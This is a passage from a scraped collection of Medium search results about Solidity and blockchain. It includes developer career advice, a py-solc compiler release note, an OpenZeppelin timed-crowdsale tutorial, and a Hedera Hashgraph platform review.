reporting period?\u201d\u201cWhat is preventing value of Augur from being copied into another contract?\u201d\u201cWhat does Augurs logo mean?\u201d", "responses": "1"}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/hey-dean-b1b706c9000d?source=search_post", "post_date": "Mar 26, 2018", "readtime": "", "upvotes": "17", "content": "Dave KajpustBlockedUnblockFollowFollowingMar 26, 2018Hey Dean,I would say it is not out of anyones depth to start being a Solidity developer. Right now you can be a dApp developer, which is basically just bridging a connection to the EVM, and front end applications. This isn\u2019t that difficult, it is mostly just web development, while adding the EVM to the stack.To be a good solidity developer would take some time, maybe a year. If you can build an actual dApp that works and interacts with the live ethereum network, you become very hireable.And to note, I don\u2019t think solidity is a hard language. It is so new, and the functionality is very basic. The whole language has one purpose: to create smart contracts. It makes it much simpler than some general purpose languages that try to do a multitude of things.Right now the hardest part is it takes time and fortitude to go learn Solidity, because the learning resources are few and far between. However, I have noticed the material has got a lot better in the last 8 months since I started, and they will continue to get better.However, as the learning materials get better, there will be more developers learning, and the high rate of pay will lower as the market balances itself.In summary, I would still suggest anyone to learn solidity and blockchain coding. But if you are going to do it, really commit to it! It is such a fast moving field, if you don\u2019t keep up with it, you can easily fall behind!Cheers,Dave", "responses": ""}, {"title": "", "author_name": "Mahesh Murthy", "link": "https://medium.com/@mvmurthy/you-have-to-deploy-a-new-contract-with-the-fix-2e8ac0475f4f?source=search_post", "post_date": "Aug 16, 2017", "readtime": "", "upvotes": "14", "content": "Mahesh MurthyBlockedUnblockFollowFollowingAug 16, 2017You have to deploy a new contract with the fix. There are strategies to implement upgradeable contracts. Basically, you have an intermediate contract which points to the actual contract. When you deploy a new contract, you update your intermediate contract to point to the new contract. That is the general idea.You can write tests in javascript or solidity. This is the closest to REPL I know of: https://ethereum.github.io/browser-solidity/", "responses": ""}, {"title": "py-solc 1.2.0\u200a\u2014\u200aNow with easy installation of different versions of the solc compiler.", "author_name": "Piper Merriam", "link": "https://medium.com/@pipermerriam/py-solc-1-2-0-now-with-easy-installation-of-different-versions-of-the-solc-compiler-95254f4fb45?source=search_post", "post_date": "Jul 5, 2017", "readtime": "2 min read", "upvotes": "134", "content": "py-solc 1.2.0\u200a\u2014\u200aNow with easy installation of different versions of the solc compiler.Piper MerriamBlockedUnblockFollowFollowingJul 5, 2017One of the first pieces of code that I wrote was a wrapper around the solc command line compiler for Solidity. Those scripts were originally part of the Populus code but were eventually extracted to create the py-solc library.py-solc exposes some high level functions for performing compilation of solidity source files.>>> from solc import compile_source>>> compile_source(\"pragma solidity ^0.4.0;\\n contract Foo {}\", output_values=[\"bin\", 'abi']){'<stdin>:Foo': {'abi': [],  'bin': '60606040523415600b57fe5b5b60338060196000396000f30060606040525bfe00a165627a7a723058201af5097131eecd7d69436b13c562763c387b13c4fb1ed58951f580d2bf81e06a0029'}}While this functionality has been helpful, one of the ongoing pain points has been access to historical versions of solidity. An important step in contract verification is confirming that the contract bytecode does indeed match the compiler output from the version of solidity it was installed with. The solcjs package for node has the ability to pull and use older versions of solidity making this relatively easy in Javascript. This functionality is however not present in the solc command line compiler, and installing older versions is not trivial.I\u2019ve used some crude bash scripts to handle installing older versions of the solc compiler in my CI environments for quite a while. While they have served their function well, they are not very extensible or usable for other purposes.In the most recent release of py-solc I\u2019ve refactored these bash scripts to introduce a new experimental feature. The ability to install different versions of solc either from python or your command line using py-solc.>>> from solc import install_solc>>> install_solc('v0.4.12')or, from your command line$ python -m solc.install v0.4.12This functionality is currently only available for the following solidity versions and corresponding operating systems.v0.4.1\u200a\u2014\u200alinuxv0.4.2\u200a\u2014\u200alinuxv0.4.6\u200a\u2014\u200alinuxv0.4.7\u200a\u2014\u200alinuxv0.4.8\u200a\u2014\u200alinux/osxv0.4.9\u200a\u2014\u200alinuxv0.4.11\u200a\u2014\u200alinux/osxv0.4.12\u200a\u2014\u200alinux/osxSo, if you need a specific version of solc either for your local environment or for some automation/testing, I\u2019d recommend giving this feature a spin. You should also feel free to open up an issue if you need a version of solidity that\u2019s not in this list, or even better, open up a pull request adding support for it.", "responses": ""}, {"title": "Token Bonding\u00a0Curves", "author_name": "Aventus Network", "link": "https://medium.com/@aventus/token-bonding-curves-547f3a04914?source=search_post", "post_date": "Nov 13, 2018", "readtime": "14 min read", "upvotes": "63", "content": "Token Bonding\u00a0CurvesAventus NetworkBlockedUnblockFollowFollowingNov 13, 2018Today\u2019s post comes from Alex Pinto, our great team asset, whose previous 2 articles, \u201cWorking with Strings in Solidity\u201d and \u201cArrays in Solidity\u201d were very welcomed by the blockchain community.", "responses": ""}, {"title": "Token Bonding\u00a0Curves", "author_name": "Aventus Network", "link": "https://blog.aventus.io/token-bonding-curves-683b8b309c18?source=search_post", "post_date": "Nov 9, 2018", "readtime": "14 min read", "upvotes": "84", "content": "Token Bonding\u00a0CurvesAventus NetworkBlockedUnblockFollowFollowingNov 9, 2018Today\u2019s post comes from Alex Pinto, our great team asset, whose previous 2 articles, \u201cWorking with Strings in Solidity\u201d and \u201cArrays in Solidity\u201d were very welcomed by the blockchain community.", "responses": ""}, {"title": "", "author_name": "Tuur Demeester", "link": "https://medium.com/@tuurdemeester/hi-pelle-you-indeed-disagreed-with-this-claim-in-your-review-af7c7a308a87?source=search_post", "post_date": "Oct 5, 2016", "readtime": "2 min read", "upvotes": "7", "content": "Tuur DemeesterBlockedUnblockFollowFollowingOct 5, 2016Hi Pelle, you indeed disagreed with this claim in your review. Another reviewer disagreed with your argument, which I then forwarded to you. This was yesterday, the day before I had planned to put out the article. Possibly I should have taken more time to study both sides of the argument (and postponed publication), but when I read both sides yesterday, the other reviewers\u2019 point struck me as more likely to be accurate. For completeness let me reproduce the main parts of the feedback here below:Your main counterargument (correct me if I needed to quote a larger part): \u201cBy the way upgrading solidity will not affect existing contracts at all. I\u2019m not sure who came up with that. You may need to upgrade existing source code to make it compatible with future versions, but existing contracts on the blockchain are immutable and will never be affected. (\u2026) Basically solidity is a compiled language, so after deployment it is really no longer important. Solidit 0.4 introduces some very good features to make it harder for naive developers to write insecure code. This breaks compilation of old solidity code, but in no way affects interaction with older deployed code.\u201dThe other reviewer\u2019s response: \u201c\u2026those criticisms are clearly wrong; if you have a bunch of code written in the language, and the compiler changes the behavior on you, sure, you\u2019re going to get different bytecode and different results in the compiled version. The comment from the transcript, in this context, appears to be about maintenance of the code written in the solidity language. Your response should be\u200a\u2014\u200awhile it might be the case that some contracts are compiled only once, there are others that are probably compiled multiple times. Source code is still important even after deployment because users are going to reuse it. If ethereum people are arguing that solidity is merely a translation layer to create contract code once\u200a\u2014\u200a\u201cwrite and forget\u201d\u200a\u2014\u200athen that\u2019s a very interesting claim that deserves elaboration in its own right.\u201dYour response to that argument (in your message to me):\u201cwhat this just means is that it\u2019s a very young ecosystem. All of these things are improving. See the Changelog for why these changes were made, but also note that they have now included a pragma statement to avoid such issues in the future. https://github.com/ethereum/solidity/blob/develop/Changelog.md#040-2016-09-0808\u00a0\u2026. These are things that typically happen in any language early on, while they are defining core features. There are several things that are still needed for making solidity a mature development environment but we\u2019re getting there. There still isn\u2019t a decent package manager, but then again it took 15 years for JS to get one and 10 years for Ruby. But great tools are appearing such as http://truffleframework.com which introduces proper testing frameworks as well as migration tools for updating code. Also remember none of these things have anything directly to do with Ethereum or the EVM, it\u2019s just Solidity.\u201d", "responses": "4"}, {"title": "How To Create A Basic Time-Sensitive Crowdsale Token With OpenZeppelin Library", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/how-to-create-a-time-sensitive-crowdsale-token-using-openzeppelin-library-8d6b679d94ef?source=search_post", "post_date": "Oct 23, 2018", "readtime": "3 min read", "upvotes": "35", "content": "How To Create A Basic Time-Sensitive Crowdsale Token With OpenZeppelin LibraryAdd an opening time and closing time for a crowdsale token using OpenZeppelin LibraryGaurav AgrawalBlockedUnblockFollowFollowingOct 23, 2018Recap: In the last tutorial series, we created a capped crowdsale using OpenZeppelin library, limiting an investor\u2019s maximum and minimum investment. In this tutorial, we will extend that concept and make our contract time sensitive as well.Today, we will add opening time and closing time for our crowdsale with open zeppelin library. We will continue building upon our ExampleTokenCrowdsale.sol contract.Benefits of time-sensitive crowdsalePlanning marketing strategiesCommunication with investorsMore focused approach because of time limitationIdea validation to pursue the project or notTime-sensitive ExampleTokenCrowdsale.sol\u00a0:Example token CrowdsaleOpen-zeppelin library provides TimeCrowdsale.sol which gives us basic functionality to create time-sensitive crowdsale.So, let\u2019s take a look:pragma solidity ^0.4.23;import \"../../math/SafeMath.sol\";import \"../Crowdsale.sol\";contract TimedCrowdsale is Crowdsale {  using SafeMath for uint256;uint256 public openingTime;  uint256 public closingTime;modifier onlyWhileOpen {    require(block.timestamp >= openingTime && block.timestamp <= closingTime);    _;  }constructor(uint256 _openingTime, uint256 _closingTime) public {    require(_openingTime >= block.timestamp);    require(_closingTime >= _openingTime);openingTime = _openingTime;    closingTime = _closingTime;  }function hasClosed() public view returns (bool) {    return block.timestamp > closingTime;  }function _preValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal    onlyWhileOpen  {    super._preValidatePurchase(_beneficiary, _weiAmount);  }}As you can see TimeCrowdsale constructor takes two parameters _openingTime and _closingTime. We will use this constructor in our ExampleTokenCrowdsale.sol to define opening time and closing time for our crowdsale.This contract uses block.timerstamp which is the timestamp of current block since epoch. This time is used in comparing the opening time and closing time for the crowdsale.It also has a _preValidatePurchase method which you can extend in your crowdsale implementation to add some specific time conditions.Now let\u2019s see how we use this contract in our ExampleTokenCrowdsale.sol constructor.constructor(uint256 _rate,   address _wallet,   ERC20 _token,   uint256 _cap,   uint256 _openingTime,   uint256 _closingTime) Crowdsale(_rate, _wallet, _token) CappedCrowdsale(_cap)  TimedCrowdsale(_openingTime, _closingTime) public{ }As you can see, we are using TimeCrowdsale in our ExampleTokenCrowdsale constructor and passing _openingTime and _closingTime.Now we can pass opening time and closing time while deploying our contracts. As mentioned in previous tutorials, open-zeppelin library is well tested and we don\u2019t need to test the functionality given by the library.But you can write some basic tests and check that everything worked fine. If you need a reference, you can check test cases which I have written while building these tokens.If you have any doubt regarding above, Let us know in comment sections.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": ""}, {"title": "More price functions for Token-Bonding Curves", "author_name": "Aventus Network", "link": "https://hackernoon.com/more-price-functions-for-token-bonding-curves-d42b325ca14b?source=search_post", "post_date": "Nov 15, 2018", "readtime": "12 min read", "upvotes": "85", "content": "More price functions for Token-Bonding CurvesAventus NetworkBlockedUnblockFollowFollowingNov 15, 2018Following last week\u2019s article, written by Alexandre Pinto, the author of Arrays in Solidity and Working with Strings in Solidity, today we continue talking about the Token Bonding Curves.", "responses": ""}, {"title": "Ethernaut Lvl 7 Force Walkthrough\u200a\u2014\u200aHow to selfdestruct and create an Ether blackhole", "author_name": "Nicole Zhu", "link": "https://medium.com/coinmonks/ethernaut-lvl-7-walkthrough-how-to-selfdestruct-and-create-an-ether-blackhole-eb5bb72d2c57?source=search_post", "post_date": "Aug 23, 2018", "readtime": "3 min read", "upvotes": "29", "content": "Ethernaut Lvl 7 Force Walkthrough\u200a\u2014\u200aHow to selfdestruct and create an Ether blackholeThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to solve the puzzles 100% on your\u00a0own.Nicole ZhuBlockedUnblockFollowFollowingAug 23, 2018This levels requires you to send ethers to an empty contract.", "responses": ""}, {"title": "Learn: New In-Depth Course for ERC721/NFTs at\u00a0Zastrin", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/zastrin-new-in-depth-course-for-erc721-nfts-14bc0609e87c?source=search_post", "post_date": "Sep 18, 2018", "readtime": "", "upvotes": "68", "content": "Learn: New In-Depth Course for ERC721/NFTs at\u00a0ZastrinLearn Solidity While Building Real\u00a0ProjectsSteven McKieBlockedUnblockFollowFollowingSep 18, 2018Zastrin is excited to announce the release of a new course ERC-721/NFT\u200a\u2014\u200aThe complete developer\u2019s guide. If you have heard of CryptoKitties or CryptoPets, you know what NFT (Non-Fungible tokens) are. There is lot of activity in the Ethereum ecosystem around NFTs and many NFT based applications are being built. Now is a good time to jump in and learn and build some NFT dApps to stay ahead of all the innovation happening in the space.In this course, you will start from the basics\u200a\u2014\u200alearn the concept of tokens, various types of tokens and then focus on Non fungible tokens. You will learn to build a complete NFT based application using Solidity smart contracts and Javascript+HTML (frontend). You can check out a demo of application you will be building here.You can also use the coupon \u2018BlockChannel\u2019 to get 50% off the course!If you have any other questions, just contact Zastrin via Mahesh@Zastrin.com", "responses": ""}, {"title": "Digix Seattle Meetup Presentation Videos\u200a\u2014\u200aNov\u00a02016", "author_name": "Digix", "link": "https://medium.com/@Digix/digix-seattle-meetup-presentation-videos-c6264ed447c?source=search_post", "post_date": "Dec 5, 2016", "readtime": "", "upvotes": "2", "content": "Digix Seattle Meetup Presentation Videos\u200a\u2014\u200aNov\u00a02016DigixBlockedUnblockFollowFollowingDec 5, 2016Solidity Contract patterns and security\u200a\u2014\u200apresentation by Anthony Eufemio (Digix CTO)Javascript testing framework for Solidity smart contracts\u200a\u2014\u200apresentation by Chris Hitchcott (Digix Core Dev)Special Thanks: Kenny Rowe from MakerDAO for editing the videos", "responses": "1"}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/check-out-ibm-hyperledger-a320d4e77d29?source=search_post", "post_date": "Mar 21, 2018", "readtime": "", "upvotes": "2", "content": "Dave KajpustBlockedUnblockFollowFollowingMar 21, 2018check out ibm hyperledger https://www.ibm.com/developerworks/cloud/library/cl-ibm-blockchain-chaincode-development-using-golang/cl-ibm-blockchain-chaincode-development-using-golang-pdf.pdfother than that the best way i have found is using solidity on ethereum. they have the most development by far for smart contracts. i would suggest finding some simple contracts and reviewing them, and then trying to recreate building them on https://remix.ethereum.org/starting with a simple ICO contract from Zepplin would be a good idea\u00a0! https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts", "responses": ""}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/hey-gabriel-d2f7b17ccae1?source=search_post", "post_date": "Aug 11, 2018", "readtime": "", "upvotes": "51", "content": "Dave KajpustBlockedUnblockFollowFollowingAug 11, 2018Hey Gabriel,Yes two years should do it. If you did it full time you could be a decent solidity developer in one year.The trick is to just develope as much as you can. The first 4 months will be hard. That is why I recommend taking a Javascript / web development bootcamp first. Javascript is a great way to learn.After 6 months of javascript move on to solidity. It will take a lot of hard work but it is worth it!Da e", "responses": ""}, {"title": "", "author_name": "Michael Marinaccio", "link": "https://the-politic.com/the-book-and-the-article-d6a85b7f9c41?source=search_post", "post_date": "Nov 29, 2015", "readtime": "6 min read", "upvotes": "1", "content": "The Book and the\u00a0ArticleMichael MarinaccioBlockedUnblockFollowFollowingNov 29, 2015The Old Library at Trinity College Dublin: http://m.marinacc.io/1Ir0svbBooks are solid. This is at once a physical description and a metaphysical one, and it is on this metaphysical solidity that we ought to ground our loyalty to the book over and against the allure of the ever-changing screen.", "responses": ""}, {"title": "", "author_name": "nderground", "link": "https://medium.com/@nderground_net/a-lot-of-people-would-disagree-with-this-characterization-of-marissa-mayer-as-well-respected-at-6647bf17d8c2?source=search_post", "post_date": "Jul 1, 2017", "readtime": "", "upvotes": "2", "content": "ndergroundBlockedUnblockFollowFollowingJul 1, 2017A lot of people would disagree with this characterization of Marissa Mayer as \u201cwell respected\u201d, at least when it comes to running a business. Her time at Yahoo did not exactly cover her in glory, although in typical CEO fashion she is walking away with a huge pile of money.Uber has the solidity of a house of cards, so it would be a challenge for anyone to move the company forward. But looking at Marissa Mayer\u2019s performance at Yahoo, I think that she would be the kiss of death for the company. I doubt that she would be the person the board would choose, since they are mostly Venture Capitalists who are desperate to get their money back. This means cleaning up the balance sheet and taking Uber public. I don\u2019t think that the markets would be welcome Marissa Mayer after the Yahoo debacle.", "responses": ""}, {"title": "The Ethereum Challengers, ep. 9: Hedera Hashgraph", "author_name": "ICO Alert", "link": "https://medium.com/@icoalert/the-ethereum-challengers-ep-9-hedera-hashgraph-406e75bea2a8?source=search_post", "post_date": "Oct 18, 2018", "readtime": "13 min read", "upvotes": "3", "content": "The Ethereum Challengers, ep. 9: Hedera HashgraphICO AlertBlockedUnblockFollowFollowingOct 18, 2018Non-blockchain distributed ledger with fast consensus, finality, Solidity, fork resistance, and a governance council of 39 organizationsBlockchains are distributed ledgers, but not all distributed ledgers are blockchains.Hedera Hashgraph, developed by Swirlds, is a distributed ledger, but not a blockchain. It will continue to be referred to as a project in the \u201cblockchain space,\u201d and that\u2019s OK thanks to our good old friend synecdoche.The hashgraph consensus mechanism shows a couple of similarities to IOTA. I discussed IOTA briefly in Six Quantum-Resistant Cryptocurrencies. IOTA\u2019s not a blockchain, but it is a distributed ledger: a Directed Acrylic Graph affectionately named the Tangle.Both attempt a trustless setup without requiring all nodes to be aware of all transactions before processing a new transaction.This enables a breed of parallelism, where transactions don\u2019t need to be sequentially processed.Our veteran cryptography and blockchain testers Alice and Bob can perform transactions at the same time and have them verified more quickly since they don\u2019t need to wait on each other in order to be processed. This results in dramatically improved performance: Nodes don\u2019t need to wait for the latest, greatest chain information in order to help verify transactions, and they don\u2019t need to all race to process the same transaction.A rare glimpse of Alice and Bob, who have been testing secure methods of exchange for many\u00a0decades.I heard about Hedera\u2019s hashgraph project early on, when their social following was little more than a handful of people.The same excitements\u200a\u2014\u200aand the same concerns\u200a\u2014\u200afollowers had for the platform in the early days are still the major thoughts expressed by Hashgraph fans and\u00a0critics.\u201cHedera\u201d is the platform, and \u201cHashgraph\u201d a description of how it works\u200a\u2014\u200asort of like how we say \u201cthe Ethereum blockchain,\u201d we say \u201cHedera Hashgraph.\u201d But the Hashgraph technology used by Hedera is unlikely to be used by many other platforms in the future.We\u2019ll talk below about how Hedera fights forks of its platform, including with patents and with code that is open review but not open source. But we\u2019ll also talk about the advantages Swirlds, the company developing and launching Hedera Hashgraph, has over competitors.\u201cThey will not require any license or any approval from Hedera\u201d (from the v1.3 whitepaper synopsis).In general, I agree with the direction the Hashgraph whitepaper comes from, so I might be quoting it more often here than usual.It\u2019s worth seeing the problems Hashgraph intends to solve, since they often overlap with the concerns everyone has with other smart contract platforms. The following section is quoted entirely from the Hashgraph whitepaper, but emphasis is mine. In fact, all quotations in this article, unless otherwise noted, are from the v1.3 whitepaper.PERFORMANCEThe most compelling use cases require hundreds of thousands of transactions per second in a single shard (perhaps millions of transactions per second (tps) in a fully-sharded solution), and many require consensus latency measured in seconds. These performance metrics are orders of magnitude beyond what current public DLT platforms can achieve.SECURITYIf public platforms are to facilitate the transfer of trillions of dollars of value, we have to expect them to be targeted, and we have to prepare for this. To do so requires a consensus algorithm that provides the best security one can achieve, with the security properties of the algorithm formally proven. Vectors of security vulnerabilities shouldn\u2019t be mitigated; they should be eliminated entirely. Other public DLT platforms are trading off decentralization (and so potentially compromising security) for performance gains.GOVERNANCEA general-purpose public ledger should be governed by representatives from a broad range of market sectors, each with world-class expertise in their respective industries, and also selected to provide global geographic representation for all markets. Those that are governing need technical expertise so they can competently manage the technical roadmap. They need business expertise so they can manage business operations of the organization. They need expertise in economics and currency markets so they can manage the cryptocurrency. They need legal expertise to help navigate the evolving regulatory environment. In other words, governance should be by those globally recognized as world leaders in their respective industries, and representative of every market in the worldSTABILITYWithout technical and legal mechanisms to enforce the decisions of the governing body, public platforms are at risk of devolving into chaos. Strong security and mature governance will enable a stable platform\u200a\u2014\u200aone that engenders the necessary trust and confidence among those that would build commercial or sensitive applications on it.REGULATORY COMPLIANCEWe expect that governments will continue to increase oversight of public ledgers and associated cryptocurrencies and tokens. We consider that a distributed public ledger must be capable of enabling appropriate Know Your Customer (KYC) and Anti Money Laundering (AML) checks.In general, these are indeed the major issues facing dapp/smart contract platforms today. Some more anarchist readers might take issue with the Regulatory Compliance point, even though \u201ccapable of enabling\u201d can hardly mean \u201cenforce.\u201d Others with commitments to purer forms of democracy won\u2019t like the Governance point.However, in both cases I\u2019d argue that these readers\u2019 concerns aren\u2019t as concerning as they seem.How does Hedera Hashgraph achieve VISA+ transaction speed?On the hashgraph, when I have a transaction verified, I don\u2019t need to communicate it to every node in the world. Yet this doesn\u2019t reduce the confidence of untalked-to nodes in the consensus, since nodes that receive transactions from a little while back end up with the whole hashgraph and have enough information to know how they would have voted.Removing the necessity for all nodes in the world to receive and confirm the latest information dramatically improves performance. It\u2019s similar to how office gossip can be a more efficient way to propagate some kinds of information than company-wide assemblies.Many blockchain systems reduce the number of nodes you need to communicate with for each block by actually reducing the number of nodes verifying on the network, like EOS with its (1)21 block producers. Hashgraph reduces the number of nodes that need to be communicated with, but not by reducing the total number of participating nodes.When Alice talks to Bob, she not only tells Bob of new transactions but also \u201cgossip about gossip,\u201d telling Bob everything she knows so far. As information randomly propagates around the hashgraph, everyone is continually brought up to date. Nodes are never very far behind. When veteran Bob tells Carol about some new transactions, he also communicates everything Alice told him, so Carol is then up to date. Soon enough, the new transactions included by Bob will be communicated back to Alice as the hashgraph continues its random propagation.It\u2019s worth noting that the hashgraph\u2019s throughput is untested on public networks and has only achieved its performance specs on private networks. How much the transition to public net will affect performance remains to be seen.FinalityBitcoin transactions aren\u2019t ever quite final.You\u2019ve noticed that transfers to cryptocurrency exchanges have a required number of confirmations\u200a\u2014\u200ablocks on top of the block containing the transfer\u200a\u2014\u200abefore funds are availables. Sometimes this is 1 or 2 confirmations, but usually it\u2019s 3 or 6. Exchanges are confident enough in the transaction.Hashgraph boasts finality, meaning that there is a point where confidence is mathematically 100%. Most blockchains approach 100% but never quite hit it.Not that this is a reason for FUD. 99.99999999999999% is practically quite similar to 100%. But it does replace the arbitrary waits for confirmation with something concrete.As if we can ever really have 100% confidence in anything.\u201cFair\u201d = \u201cFirst Come, First\u00a0Served\u201dNor are Bitcoin transactions fair, by Hashgraph\u2019s definition of fairness.Suppose there\u2019s a piece of art up for purchase.Our veterans Alice and Bob, weary from their endless testing of every transaction for every whitepaper in existence, each want to spruce up their testing chambers with something profoundly non-digital. Alice buys the artwork with a Bitcoin transaction. Bob buys it a few seconds later. Miners can arbitrarily choose which transaction to include first, meaning that Bob might end up, for the first time in his life, beating Alice to the punch at something involving a crypto transaction.That\u2019s arguably not fair. On Hashgraph, transactions have a timestamp by consensus, which reflects (by averaging) the time \u201cwhen the majority of the network members received that transaction.\u201dAs the whitepaper continues, \u201cthis consensus timestamping is useful for things such as a legal obligation to perform some action by a particular time. There will be a consensus on whether an event happened by a deadline, and the timestamp is resistant to manipulation by an attacker.\u201dIt might not be fair to describe fairness as binary. Two transactions days apart won\u2019t get swapped in order by the Bitcoin network, and two transactions milliseconds apart might get flipped by the Hashgraph network, though not intentionally. But in practical life, the ordering of transactions is fairer in Hashgraph than in a number of systems.Separation of Governance and ConsensusNow, it\u2019s time to talk about some of the concerns Hashgrapites (Hashgraphics? Hashgraphenes?) face when they talk about Hedera Hashgraph with their crypto friends.Among those concerns is the Hedera Hashgraph Council, which really sounds like something out of Netrunner.Hedera\u2019s consensus model, unlike many dPoS, dBFT, and similar systems like EOS and NEO, is not restricted to a smaller council of nodes. I plan to run a Hashgraph node at home and earn some Hashgraph once the network is out, but I don\u2019t ever plan to produce EOS blocks.Governance, however, is restricted to a council. Swirlds will license Hedera Hashgraph out to the council, in exchange for \u201c10% of revenue (with monthly minimums) and Swirlds [owning] 5% of Hedera coins.\u201d Council members, with the exception of Swirlds, will have term limits, and the council will vote in additional council members.The HHC\u200a\u2014\u200asince the space doesn\u2019t have enough three-letter acronyms yet\u200a\u2014\u200awill be made up of 39 organizations. I heard about plans for the council first-hand at a Hashgraph meetup in New York, and it\u2019s my understanding that a number of companies have been approached, and some have responded, selected for geographical diversity, diversity of industry, and potential reputation loss (to economically discourage them from messing with Hashgraph governance to further their own ends).Let\u2019s do a rapid-fire round of short sections highlighting some Hedera Hashgraph features.Fork Off!Forking Swirlds\u2019s Hedera Hashgraph code is legally difficult, as the codebase is patented. This isn\u2019t closed-source, since the code is open review, but Swirlds plans to aggressively pursue violators of their patent legally.Of course, the crypto space includes enough hackers and anarchists that we cannot eliminate the possibility that some project will anonymously fork the code, but Swirlds would pursue companies using the fork, so adoption would probably be limited.According to the whitepaper, forks of the hashgraph (\u201cchain splits,\u201d to carry over blockchain lingo) are possible, but they must have a new genesis block. No client can be deceived into thinking the fork is the original Hashgraph chain. Even a 50/50 split would end with neither graph being able to include anything between the original hashgraph genesis and the fork. So, splits can happen, but not in a deceptive fashion.Liberty, Identity, SolidityHashgraph will allow for identity information by providers to be linked to accounts (even temporarily). While the hashgraph won\u2019t have KYC or de-anonymization built in, users that need to verify their identity for a company, bank, government agency, etc. will ultimately be able to do so.Another potential advantage of Hedera Hashgraph is that it will, on launch, run Solidity contracts. Ethereum projects can easily move over.Staking and Proxy Staking HashgraphIt seems that running hashgraph nodes will be easy, since old hashgraph data can be discarded by nodes, reducing the memory required, and since hashgraph verification relies on randomness and stake rather than proof of work.\u201cWhen the Hedera platform is running at scale, any user will be able to run a node in the network and earn cryptocurrency payments for doing so.\u201dHedera Hashgraph also introduces proxy staking, where a user who wants to stake but does not want to run a node can delegate their stake to a node. The node and user providing the staked tokens can negotiate the way they split profits.Storing Files in the HashgraphWe\u2019re moving through features quickly here, but Hedera Hashgraph will also include file storage. \u201cEvery node in the shard stores the same files, so they will not be lost if one of the nodes crashes. Stored information can only be deleted by those that were given permission.\u201d Nodes will actually store files, and to my knowledge it remains to be seen how much of a storage requirement this imposes on the nodes.It does seem that the file storage system will be easy to work with, both secure and flexible. \u201cWe give developers Java code to manipulate a Merkle tree as if it were a file system\u00a0\u2026 A file can be accessed by its hash, so people can rely on the fact that it is immutable. But it also has a File ID.\u201dWhen you store a file on the hashgraph, you can verify its immutability with the hash, proving it hasn\u2019t been modified since a certain time, but you can also allow for easy revisions via the file ID, which tracks a file even if it\u2019s been modified.Sharding (Again)Many projects have discussed sharding to improve blockchain performance. Borrowed from conventional databases, sharding basically splits a chain into sub-chains that are semi-independent parts of the whole. It\u2019s an explicit kind of parallelism, and one that Ethereum and a number of other projects plan. However, secure implementation of sharding for a distributed ledger hasn\u2019t been proven yet.Sharding reduces the number of nodes on each shard, and thus reduces the stake required to attack the network. Assuming malicious actors need to achieve 31% of the network in order to attack it, that 31% is much easier to obtain for a shard. Because of this and the complexity of implementing sharding, no project to my knowledge has taken any steps towards sharding in their live product.Projects on HashgraphHedera Hashgraph did run a sale round open to accredited investors, and SAFT investments are still available.Some projects partnering with Hedera for their ongoing mainnet rollout are running token sales this year. Hedera Hashgraph has announced a number of these projects, but to my knowledge the only sale currently open at this writing is hearo.fm.Hearo.fm pays micropayments directly from music listeners to music artists. The platform\u2019s move to Hedera Hashgraph will take advantage of the hashgraph\u2019s speed to make their project a decentralized, scalable potential solution for many of the problems currently wracking the music industry.Other early HH partners include real estate project Red Swan and MZ, the creators of Game of War.Now, let\u2019s summarize Hashgraph vs. Ethereum by asking the same questions the series has followed in each installment so far.1) ScalabilityAs with most solutions that currently promise scalability, Hedera Hashgraph is not based on a proof-of-work consensus model. However, unlike most of these solutions, consensus is not restricted to a small circle of some variant of supernodes. Hedera Hashgraph is not yet live, but tests exceed VISA\u2019s transaction throughput. It remains to be seen how well the hashgraph performs in practice, but it will clearly be orders of magnitude faster than Ethereum.2) GovernanceGovernance is separate from consensus. Consensus is decentralized, but governance is conducted by the 39-member Hedera Hashgraph Council. Members besides Swirlds, the developer of Hedera Hashgraph, are diverse organizations with limited terms on the council and with immense reputation to lose if they act in their own interests and against the interests of the network.3) Development ComplexityHedera Hashgraph will launch with support for Solidity smart contracts, so development complexity is on par with Ethereum. I haven\u2019t yet seen information on how easy or difficult it is to update these contracts or on what development resources for Ethereum will be usable on or portable to HH development.4) TimelineThe public hashgraph is live, with support for the cryptocurrency, file storage, and Solidity smart contracts. APIs are live, as well, and other features are currently rolling out. Users will be able to create new accounts within the next 4 months.5) Generalized FeaturesHedera Hashgraph offers file storage and plans to offer support for secure identity on the platform.6) AdoptabilityTransaction fees are small but still existent. However, fees are split into several categories, so a large portion is refundable in case of transaction failure for whatever reason. I suspect applications will abstract fees away from the user, much as will likely happen with Ethereum (and has already happened with Peepeth, which no longer even requires an Ethereum account to be used).7) Market\u00a0PositionHedera Hashgraph has been building buzz for a number of months now. Unless significantly more funds are raised, HH is significantly behind Ethereum and even EOS and some other alternatives in terms of developer interest, funding, and toolset. However, sooner or later the success of platforms will depend not on hype and on actual usage, so the development of killer applications that take advantage of Hedera Hashgraph\u2019s capabilities is the platform\u2019s chance to make gains on the competition.The next Ethereum Challenger we\u2019ll consider is IOST, Internet of Services Token. It\u2019s seen significant interest in the past couple of months. Is it a rip-off of EOS? Or an improvement? We\u2019ll discuss that in a couple of weeks.", "responses": ""}, {"title": "Code Pattern: Blockchain Voting\u200a\u2014\u200aDevelop a voting application with hyperledger and\u00a0ethereum", "author_name": "IBM Developer", "link": "https://medium.com/@IBMDeveloper/code-pattern-blockchain-voting-develop-a-voting-application-with-hyperledger-and-ethereum-6cdb3cb1d657?source=search_post", "post_date": "Dec 17, 2018", "readtime": "", "upvotes": "5", "content": "Code Pattern: Blockchain Voting\u200a\u2014\u200aDevelop a voting application with hyperledger and\u00a0ethereumIBM DeveloperBlockedUnblockFollowFollowingDec 17, 2018This code pattern shows you how to build a decentralized application that invokes methods on a Solidity smart contract running in Hyperledger Fabric. It includes a Fabric proxy server that translates Web3 calls to and from a running Hyperledger Fabric and Chaincode Ethereum Virtual Machine (EVM) combined framework that enables the deployment of these smart contracts.DescriptionThis decentralized 